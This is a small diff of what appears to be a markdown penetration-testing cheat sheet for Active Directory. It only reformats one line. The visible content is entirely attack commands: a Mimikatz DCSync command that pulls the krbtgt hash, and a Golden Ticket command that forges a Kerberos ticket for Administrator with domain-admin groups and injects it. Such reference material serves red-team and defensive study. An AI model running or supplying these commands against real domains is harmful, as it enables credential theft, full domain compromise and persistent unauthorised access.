@@ -10,7 +10,9 @@ C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user_<domain>\krbtgt"'
 ```
 ### Golden Ticket
 ```powershell
-C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<fqdn_domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<fqdn_domain> 
+                                         /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:500 
+                                         /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 
 
